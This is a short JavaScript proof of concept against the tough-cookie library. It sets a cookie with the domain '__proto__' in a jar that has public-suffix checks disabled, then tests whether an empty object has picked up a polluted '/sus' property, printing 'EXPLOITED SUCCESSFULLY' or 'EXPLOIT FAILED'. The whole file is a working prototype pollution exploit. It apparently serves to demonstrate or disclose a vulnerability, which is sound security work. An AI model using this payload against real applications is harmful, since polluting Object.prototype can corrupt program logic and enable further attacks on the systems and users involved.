const tough = require("tough-cookie");

const jar = new tough.CookieJar(undefined, {
    rejectPublicSuffixes: false
  });

  jar.setCookieSync(
    "Slonser=polluted; Domain=__proto__; Path=/sus",
    "https://__proto__/sus"
  );

const object = {};

if (object["/sus"]) {
    console.error("EXPLOITED SUCCESSFULLY")
} else {
    console.log("EXPLOIT FAILED");
}
